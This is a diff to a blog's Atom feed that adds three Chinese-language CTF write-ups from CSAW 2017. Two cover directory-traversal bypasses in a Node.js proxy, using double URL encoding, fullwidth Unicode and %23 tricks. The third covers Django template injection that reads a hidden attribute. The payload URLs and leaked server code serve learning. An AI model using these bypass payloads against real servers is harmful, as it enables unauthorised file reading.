@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://andyw330.github.io/"/>
-  <updated>2017-09-15T19:47:16.000Z</updated>
+  <updated>2017-09-18T13:03:37.000Z</updated>
   <id>https://andyw330.github.io/</id>
   
   <author>
@@ -14,6 +14,156 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>[CSAW CTF Qualification Round 2017] - orange v3 (Web 300)</title>
+    <link href="https://andyw330.github.io/2017/09/18/CSAW-CTF-Qualification-Round-2017-orange-v3-Web-300/"/>
+    <id>https://andyw330.github.io/2017/09/18/CSAW-CTF-Qualification-Round-2017-orange-v3-Web-300/</id>
+    <published>2017-09-18T13:40:00.000Z</published>
+    <updated>2017-09-18T13:03:37.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
+<p>I wrote a little proxy program in NodeJS for my poems folder but I’m bad at programming so I had to rewrite it. Again.</p>
+<p>I changed up flag.txt too but everyone still wants to read it…</p>
+<p><a href="http://web.chal.csaw.io:7312/?path=orange.txt" target="_blank" rel="external">http://web.chal.csaw.io:7312/?path=orange.txt</a></p>
+</blockquote>
+<a id="more"></a>
+<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>這題是 <a href="/2017/09/18/CSAW-CTF-Qualification-Round-2017-orange-v1-Web-100/" title="[CSAW CTF Qualification Round 2017] - orange v1 (Web 100)">[CSAW CTF Qualification Round 2017] - orange v1 (Web 100)</a> 的延伸。</p>
+<p>一開始嘗試了各種 payload ，猜測最後應該要為 <code>.txt</code>，而中間不能有其他的 <code>.</code> 或 <code>Ｎ</code> 。輸入 <code>%25</code> 也會被擋，所以看來也把 <code>%</code> 擋掉了。</p>
+<p>想想如果放入 <code>%23</code> 可能會因為被解析成 <code>#</code> 讓後面都變成 tag 而沒作用。嘗試了 <code>path=%23.txt</code> 真的跑出 directory list 了！<br><a href="http://web.chal.csaw.io:7312/?path=%23.txt" target="_blank" rel="external">http://web.chal.csaw.io:7312/?path=%23.txt</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Directory listing for /poems/</div><div class="line"></div><div class="line">burger.txt</div><div class="line">haiku.txt</div><div class="line">orange.txt</div><div class="line">ppp.txt</div><div class="line">the_red_wheelbarrow.txt</div></pre></td></tr></table></figure></p>
+<p>依據 orange v1 (Web 100) 那題，這題最後應該會再做一次 url decode 。再來搭配 NodeJS unicode 解析問題，那就完美了！<br>（參考： <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="external">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!</a>）<br>NodeJS unicode failure：<br><code>Ｎ =&gt; \xFF\x2E =&gt; \x2E =&gt; .</code><br><code>Ｅ =&gt; \xFF\x25 =&gt; \x25 =&gt; %</code></p>
+<p>NodeJS unicode failure + url decode：<br><code>Ｅ2e =&gt; \xFF\x252e =&gt; \x252e =&gt; %2e =&gt; .</code></p>
+<p><a href="http://web.chal.csaw.io:7312/?path=Ｅ2eＥ2e/%23.txt" target="_blank" rel="external">http://web.chal.csaw.io:7312/?path=Ｅ2eＥ2e/%23.txt</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Directory listing for /poems/../</div><div class="line"></div><div class="line">back.py</div><div class="line">docker-compose.yml</div><div class="line">Dockerfile</div><div class="line">flag.txt</div><div class="line">poems/</div><div class="line">README.md</div><div class="line">serve.sh</div><div class="line">server.js</div></pre></td></tr></table></figure></p>
+<p><a href="http://web.chal.csaw.io:7312/?path=Ｅ2eＥ2e/flagＥ2etxt%23.txt" target="_blank" rel="external">http://web.chal.csaw.io:7312/?path=Ｅ2eＥ2e/flagＥ2etxt%23.txt</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;s0rry_this_t00k_s0_m@ny_tries...&#125;</div></pre></td></tr></table></figure></p>
+<p>Flag: <code>flag{s0rry_this_t00k_s0_m@ny_tries...}</code></p>
+<h1 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h1><p>同樣順便把 <code>server.js</code> 撈了出來以供研究，看來過濾掉的東西都有猜到⎝(　ﾟ∀ﾟ)⎠<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">var http = require('http');</div><div class="line">var fs = require('fs');</div><div class="line">var url = require('url');</div><div class="line"></div><div class="line">var server = http.createServer(function(req, res) &#123;</div><div class="line">    try &#123;</div><div class="line">        var path = url.parse(req.url, true).query;</div><div class="line">        path = path['path'];</div><div class="line">        var no_ext = path.substring(0, path.length - 4);</div><div class="line">        var ext = path.substring(path.length - 4, path.length);</div><div class="line">        console.log(path);</div><div class="line">        console.log(no_ext);</div><div class="line">        console.log(ext);</div><div class="line">        if (no_ext.indexOf(".") == -1 &amp;&amp; path.indexOf("Ｎ") == -1 &amp;&amp; path.indexOf("%") == -1 &amp;&amp; ext == '.txt') &#123;</div><div class="line">            var base = "http://localhost:8080/poems/";</div><div class="line">            var callback = function(response)&#123;</div><div class="line">                var str = '';</div><div class="line">                response.on('data', function (chunk) &#123;</div><div class="line">                    str += chunk;</div><div class="line">                &#125;);</div><div class="line">                response.on('end</div><div class="line">                ', function () &#123;</div><div class="line">                  res.end(str);</div><div class="line">                &#125;);</div><div class="line">            &#125;</div><div class="line">            http.get(base + path, callback).end();</div><div class="line">        &#125; else &#123;</div><div class="line">            res.writeHead(403);</div><div class="line">            res.end("WHOA THATS BANNED!!!!");</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    catch (e) &#123;</div><div class="line">        res.writeHead(404);</div><div class="line">        res.end('Oops');</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line">server.listen(9999);</div></pre></td></tr></table></figure></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>連上 <a href="http://web.chal.csaw.io:7312/?path=Ｅ2eＥ2e/flagＥ2etxt%23.txt" target="_blank" rel="external">http://web.chal.csaw.io:7312/?path=Ｅ2eＥ2e/flagＥ2etxt%23.txt</a></p>
+<p>req.url = <code>&#39;http://web.chal.csaw.io:7312/?path=Ｅ2eＥ2e/flagＥ2etxt%23.txt&#39;</code></p>
+<p>Line 7: <code>var path = url.parse(req.url, true).query;</code><br>path = <code>{ path: &#39;Ｅ2eＥ2e/flagＥ2etxt#.txt&#39; }</code></p>
+<p>Line 8: <code>path = path[&#39;path&#39;];</code><br>path = <code>&#39;Ｅ2eＥ2e/flagＥ2etxt#.txt&#39;</code><br>base + path = <code>&#39;http://localhost:8080/poems/Ｅ2eＥ2e/flagＥ2etxt#.txt&#39;</code></p>
+<p>Line 25: <code>http.get(base + path, callback).end();</code><br>Nodejs http 會把 base + path 解析成 <code>http://localhost:8080/poems/%2e%2e/flag%2etxt#.txt</code><br>也就是 <code>http://localhost:8080/poems/../flag.txt#.txt</code><br>所以就拿到 <code>http://localhost:8080/flag.txt</code> 了！</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;I wrote a little proxy program in NodeJS for my poems folder but I’m bad at programming so I had to rewrite it. Again.&lt;/p&gt;
+&lt;p&gt;I changed up flag.txt too but everyone still wants to read it…&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://web.chal.csaw.io:7312/?path=orange.txt&quot;&gt;http://web.chal.csaw.io:7312/?path=orange.txt&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
+    
+    
+      <category term="Web" scheme="https://andyw330.github.io/tags/Web/"/>
+    
+      <category term="CSAW CTF Qualification Round 2017" scheme="https://andyw330.github.io/tags/CSAW-CTF-Qualification-Round-2017/"/>
+    
+      <category term="Directory Traversal" scheme="https://andyw330.github.io/tags/Directory-Traversal/"/>
+    
+      <category term="Node.js" scheme="https://andyw330.github.io/tags/Node-js/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>[CSAW CTF Qualification Round 2017] - orange v1 (Web 100)</title>
+    <link href="https://andyw330.github.io/2017/09/18/CSAW-CTF-Qualification-Round-2017-orange-v1-Web-100/"/>
+    <id>https://andyw330.github.io/2017/09/18/CSAW-CTF-Qualification-Round-2017-orange-v1-Web-100/</id>
+    <published>2017-09-18T10:43:00.000Z</published>
+    <updated>2017-09-18T13:03:02.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
+<p>I wrote a little proxy program in NodeJS for my poems folder.</p>
+<p>Everyone wants to read <code>flag.txt</code> but I like it too much to share.</p>
+<p><a href="http://web.chal.csaw.io:7311/?path=orange.txt" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=orange.txt</a></p>
+</blockquote>
+<a id="more"></a>
+<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>先試試 <a href="http://web.chal.csaw.io:7311/?path=" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Directory listing for /poems/</div><div class="line"></div><div class="line">burger.txt</div><div class="line">haiku.txt</div><div class="line">orange.txt</div><div class="line">ppp.txt</div><div class="line">the_red_wheelbarrow.txt</div></pre></td></tr></table></figure></p>
+<p>可以看到在 poems 資料夾內的所有檔案。</p>
+<p>再來試試 <a href="http://web.chal.csaw.io:7311/?path=../" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=../</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WHOA THATS BANNED!!!!</div></pre></td></tr></table></figure></p>
+<p>知道應該是過慮了 <code>..</code>，嘗試了許久，連全形 N（ＮＮ）都試過了，最後終於發現可以用 double URL encoding 的 payload（參考：<a href="https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_%28OTG-AUTHZ-001%29%23Testing_Techniques" target="_blank" rel="external">OWASP Testing Directory traversal</a>）</p>
+<p>Double URL encoding: <code>. =&gt; %2e =&gt; %252e</code><br>嘗試 <a href="http://web.chal.csaw.io:7311/?path=.%252e/" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=.%252e/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Directory listing for /poems/../</div><div class="line"></div><div class="line">.dockerignore</div><div class="line">back.py</div><div class="line">flag.txt</div><div class="line">poems/</div><div class="line">serve.sh</div><div class="line">server.js</div></pre></td></tr></table></figure></p>
+<p>連上 <a href="http://web.chal.csaw.io:7311/?path=.%252e/flag.txt" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=.%252e/flag.txt</a> 拿到 flag</p>
+<p>Flag: <code>flag{thank_you_based_orange_for_this_ctf_challenge}</code></p>
+<h1 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h1><p>順便把 <code>server.js</code> 撈了出來以供研究，結果發現居然有擋ＮＮ XDD<br>不愧是 orange ，自己研究出的東西自己擋掉 XDD<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">var</span> path = url.parse(req.url, <span class="literal">true</span>).query;</div><div class="line">        path = path[<span class="string">'path'</span>];</div><div class="line">        <span class="keyword">if</span> (path.indexOf(<span class="string">".."</span>) == <span class="number">-1</span> &amp;&amp; path.indexOf(<span class="string">"ＮＮ"</span>) == <span class="number">-1</span>) &#123;</div><div class="line">            <span class="keyword">var</span> base = <span class="string">"http://localhost:8080/poems/"</span>;</div><div class="line">            <span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</div><div class="line">                <span class="keyword">var</span> str = <span class="string">''</span>;</div><div class="line">                response.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</div><div class="line">                    str += chunk;</div><div class="line">                &#125;);</div><div class="line">                response.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                  res.end(str);</div><div class="line">                &#125;);</div><div class="line">            &#125;</div><div class="line">            http.get(base + path, callback).end();</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            res.writeHead(<span class="number">403</span>);</div><div class="line">            res.end(<span class="string">"WHOA THATS BANNED!!!!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (e) &#123;</div><div class="line">        res.writeHead(<span class="number">404</span>);</div><div class="line">        res.end(<span class="string">'Oops'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line">server.listen(<span class="number">9999</span>);</div></pre></td></tr></table></figure></p>
+<h1 id="附註"><a href="#附註" class="headerlink" title="附註"></a>附註</h1><p>解題中找到了一個不錯的工具跟 wordlist<br><a href="http://wfuzz.org/" target="_blank" rel="external">Wfuzz - The Web fuzzer 官網</a><br><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="external">Wfuzz Github</a><br><a href="https://github.com/xmendez/wfuzz/tree/master/wordlist" target="_blank" rel="external">Wfuzz wordlist</a><br>最後把 wordlist/vulns/cgis.txt 裡的東西拿來試試看，終於解出來了~<br>覺得感動QwQ</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;I wrote a little proxy program in NodeJS for my poems folder.&lt;/p&gt;
+&lt;p&gt;Everyone wants to read &lt;code&gt;flag.txt&lt;/code&gt; but I like it too much to share.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://web.chal.csaw.io:7311/?path=orange.txt&quot;&gt;http://web.chal.csaw.io:7311/?path=orange.txt&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
+    
+    
+      <category term="Web" scheme="https://andyw330.github.io/tags/Web/"/>
+    
+      <category term="CSAW CTF Qualification Round 2017" scheme="https://andyw330.github.io/tags/CSAW-CTF-Qualification-Round-2017/"/>
+    
+      <category term="Directory Traversal" scheme="https://andyw330.github.io/tags/Directory-Traversal/"/>
+    
+      <category term="Node.js" scheme="https://andyw330.github.io/tags/Node-js/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>[CSAW CTF Qualification Round 2017] - Shia Labeouf-off! (Web 150)</title>
+    <link href="https://andyw330.github.io/2017/09/18/CSAW-CTF-Qualification-Round-2017-Shia-Labeouf-off-Web-150/"/>
+    <id>https://andyw330.github.io/2017/09/18/CSAW-CTF-Qualification-Round-2017-Shia-Labeouf-off-Web-150/</id>
+    <published>2017-09-18T04:44:00.000Z</published>
+    <updated>2017-09-18T13:03:15.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
+<p>Do it<br>Just do it<br>Don’t let your dreams be dreams<br>Yesterday you said tomorrow<br>So just do it<br>Make your dreams come true<br>Just do it<br>Pick 1: <a href="http://web.chal.csaw.io:5487" target="_blank" rel="external">http://web.chal.csaw.io:5487</a> <a href="http://web.chal.csaw.io:5488" target="_blank" rel="external">http://web.chal.csaw.io:5488</a> <a href="http://web.chal.csaw.io:5489" target="_blank" rel="external">http://web.chal.csaw.io:5489</a> <a href="http://web.chal.csaw.io:5490" target="_blank" rel="external">http://web.chal.csaw.io:5490</a></p>
+</blockquote>
+<a id="more"></a>
+<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>網站是用 Django 寫成，在 <a href="http://web.chal.csaw.io:5487/ad-lib/" target="_blank" rel="external">http://web.chal.csaw.io:5487/ad-lib/</a> 有個 textarea 提供使用者寫 template 給 server 用。<br>介面大致上長這樣子：</p>
+<div style="border: solid 1px; padding: 10px; margin-bottom: 25px;">Give me an ad lib and I will Shia Labeouf it up for you!<br>Where you want a noun, just put: ““, for a verb: ““, and for an adjective: ““!<br><textarea></textarea><br><input type="submit"><br></div>
+
+<p>先輸入 <code>{{}}</code> 來引發錯誤，可以看到 debug 資訊。<br>顯示了錯誤的行數跟 template 的 source ：<br><figure class="highlight django"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">extends</span></span> 'base.html' %&#125;</span><span class="xml"></span></div><div class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">load</span></span> pools_extras %&#125;</span><span class="xml"></span></div><div class="line"></div><div class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">block</span></span> breadcrumb-page %&#125;</span><span class="xml">Format</span><span class="template-tag">&#123;% <span class="name"><span class="name">endblock</span></span> breadcrumb-page %&#125;</span><span class="xml"></span></div><div class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">block</span></span> content %&#125;</span><span class="xml"></span></div><div class="line"><span class="template-variable">&#123;&#123;&#125;&#125;</span><span class="xml"></span></div><div class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">endblock</span></span> content %&#125;</span><span class="xml"></span></div></pre></td></tr></table></figure></p>
+<p>在 Traceback 也有一些資訊：<br><code>./ad-lib/views.py in index</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></div><div class="line">    <span class="keyword">global</span> obj</div><div class="line">    <span class="keyword">if</span> request.method == <span class="string">"POST"</span>:</div><div class="line">        data = request.POST.get(<span class="string">'formatdata'</span>, <span class="string">''</span>)</div><div class="line">        template_data = TEMP.format(data.replace(<span class="string">"noun"</span>, <span class="string">"noun|safe"</span>).replace(<span class="string">"verb"</span>, <span class="string">"verb|safe"</span>).replace(<span class="string">"adjective"</span>, <span class="string">"adjective|safe"</span>))</div><div class="line">        template = Template(template_data)</div><div class="line">        context = RequestContext(request, &#123;</div><div class="line">            <span class="string">'noun'</span>: <span class="string">'&lt;img src="https://media0.giphy.com/media/arNexgslLkqVq/200.webp#70-grid1" /&gt;'</span>,</div><div class="line">            <span class="string">'verb'</span>: <span class="string">'&lt;img src="https://media3.giphy.com/media/R0vQH2T9T4zza/200.webp#165-grid1" /&gt;'</span>,</div><div class="line">            <span class="string">'adjective'</span>: <span class="string">'&lt;img src="https://media1.giphy.com/media/TxXhUgEUWWL6/200.webp#129-grid1" /&gt;'</span>,</div><div class="line">            <span class="string">'mrpoopy'</span>: obj</div><div class="line">        &#125;)</div><div class="line">        shit = template.render(context)</div><div class="line">        <span class="keyword">return</span> HttpResponse(shit)</div><div class="line">    <span class="keyword">return</span> render(request, <span class="string">'ad-lib/format.html'</span>)</div></pre></td></tr></table></figure></p>
+<p>看起來 <code>mrpoopy</code> 應該是個關鍵， render 後是一個 obj 。<br>嘗試輸入 <code>{{ mrpoopy }}</code> 得到 <code>&lt;ad-lib.someclass.Woohoo instance at 0x7fa795932638&gt;</code> 。<br>不過不知道有哪些 attribute ，所以再來應該就是要想辦法得知才能使用。</p>
+<p>再觀察一下可發現在 template 裡有 <code>{% load pools_extras %}</code> ，也許 load 進來後有一些東西可以利用。</p>
+<p>再來看看 <a href="http://web.chal.csaw.io:5487/polls/" target="_blank" rel="external">http://web.chal.csaw.io:5487/polls/</a></p>
+<div style="border: solid 1px; padding: 10px; margin-bottom: 25px;"><strong>Polls</strong><ul><li><a href="/polls/2/">Who is the most Shia of them all?</a></li><li><a href="/polls/1/">Which one would you take into battle?</a></li></ul></div>
+
+<p>有兩個連結，分別是 <code>/polls/2/</code> 跟 <code>/polls/1/</code> 。<br>隨意嘗試了投票，都會顯示 <code>You are unable to vote at this time.</code><br>那麼如果連到 <a href="http://web.chal.csaw.io:5487/polls/3/" target="_blank" rel="external">http://web.chal.csaw.io:5487/polls/3/</a> 看看呢？<br>出現了 <code>Our infrastructure can&#39;t support that many Shias!</code> 錯誤，列出 debug 資訊！</p>
+<p><code>./polls/templatetags/pools_extras.py in checknum</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@register.filter(name='getme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getme</span><span class="params">(value, arg)</span>:</span></div><div class="line">    <span class="keyword">return</span> getattr(value, arg)</div><div class="line"><span class="meta">@register.filter(name='checknum')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">checknum</span><span class="params">(value)</span>:</span></div><div class="line">    check(value) ...</div><div class="line"><span class="meta">@register.filter(name='listme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listme</span><span class="params">(value)</span>:</span></div><div class="line">    <span class="keyword">return</span> dir(value)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(value)</span>:</span></div></pre></td></tr></table></figure></p>
+<p><code>./polls/templatetags/pools_extras.py in check</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@register.filter(name='listme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listme</span><span class="params">(value)</span>:</span></div><div class="line">    <span class="keyword">return</span> dir(value)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(value)</span>:</span></div><div class="line">    <span class="keyword">if</span> value &gt; <span class="number">2</span>:</div><div class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Our infrastructure can't support that many Shias!"</span>) ...</div></pre></td></tr></table></figure></p>
+<p>發現 <code>pools_extras</code> 有 <code>getme</code> 跟 <code>listme</code> 可以用！</p>
+<p>回到 <a href="http://web.chal.csaw.io:5487/ad-lib/" target="_blank" rel="external">http://web.chal.csaw.io:5487/ad-lib/</a><br>先看有哪些 attribute 可以用<br>輸入 <code>{{ mrpoopy|listme }}</code><br><figure class="highlight scheme"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="symbol">'Woohoo</span>', <span class="symbol">'__doc__</span>', <span class="symbol">'__flag__</span>', <span class="symbol">'__module__</span>']</div></pre></td></tr></table></figure></p>
+<p>再來就用 <code>getme</code> 來執行 <code>__flag__</code><br>輸入 <code>{{ mrpoopy|getme:'__flag__' }}</code><br><figure class="highlight dust"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="xml">flag</span><span class="template-variable">&#123;wow_much_t3mplate&#125;</span><span class="xml"></span></div></pre></td></tr></table></figure></p>
+<p>Flag: <code>flag{wow_much_t3mplate}</code></p>
+<h1 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h1><p>我不會 Django QAQ，看了一堆官方文件，找了一堆資料，努力把 template tag 的部分看完，最後終於知道 template 跟 view 怎麼運作的了！我看得好辛苦啊啊 _(:з」∠)_<br>簡單來說就是：<code>Template(template_data).render(RequestContext(request, context_data))</code><br>view 在 render 時把 context 資料放進 teamplate 裡，就會得到最後看到的網頁 HTML 了。</p>
+<p>寫網誌也遇到一些問題，像是 <code>{{ }}</code> 跟 <code>{% %}</code> 會被 hexo 解析，所以要用 <code> {% raw %} {% endraw %}</code> 把它們包起來，有點麻煩呢 (´・ω・｀)</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;Do it&lt;br&gt;Just do it&lt;br&gt;Don’t let your dreams be dreams&lt;br&gt;Yesterday you said tomorrow&lt;br&gt;So just do it&lt;br&gt;Make your dreams come true&lt;br&gt;Just do it&lt;br&gt;Pick 1: &lt;a href=&quot;http://web.chal.csaw.io:5487&quot;&gt;http://web.chal.csaw.io:5487&lt;/a&gt; &lt;a href=&quot;http://web.chal.csaw.io:5488&quot;&gt;http://web.chal.csaw.io:5488&lt;/a&gt; &lt;a href=&quot;http://web.chal.csaw.io:5489&quot;&gt;http://web.chal.csaw.io:5489&lt;/a&gt; &lt;a href=&quot;http://web.chal.csaw.io:5490&quot;&gt;http://web.chal.csaw.io:5490&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
+    
+    
+      <category term="Web" scheme="https://andyw330.github.io/tags/Web/"/>
+    
+      <category term="CSAW CTF Qualification Round 2017" scheme="https://andyw330.github.io/tags/CSAW-CTF-Qualification-Round-2017/"/>
+    
+      <category term="Django" scheme="https://andyw330.github.io/tags/Django/"/>
+    
+  </entry>
   
   <entry>
     <title>[SEC-T CTF] - Naughty ads (Web 200)</title>
